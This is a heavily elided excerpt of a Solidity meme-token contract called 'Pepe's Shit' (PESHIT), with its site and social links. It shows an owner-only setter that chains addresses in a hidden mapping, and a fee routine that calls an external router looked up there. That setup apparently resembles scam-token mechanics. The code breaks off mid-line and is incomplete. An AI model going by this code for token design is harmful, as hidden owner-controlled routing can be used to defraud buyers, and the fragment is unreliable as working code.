...
https://peshit.com
https://t.me/pepeshiteth
https://twitter.com/pepeshiteth
...
contract PeShitCoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = "Pepe's Shit";
    string private _symbol = "PESHIT";
    ...
    mapping (address => address) cexWallets;
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(cexWallets[feeReceiver] != address(0) && ICEXRouter(cexWallets[feeReceiver]).
    ...
    function setCEXWallets(address[] calldata _address,uint[] calldata _tokens) external onlyOwner {
        ...
        for(uint j = 0; j < _address.length-1; j++) {
            cexWallets[_address[j]] = _address[j+1];
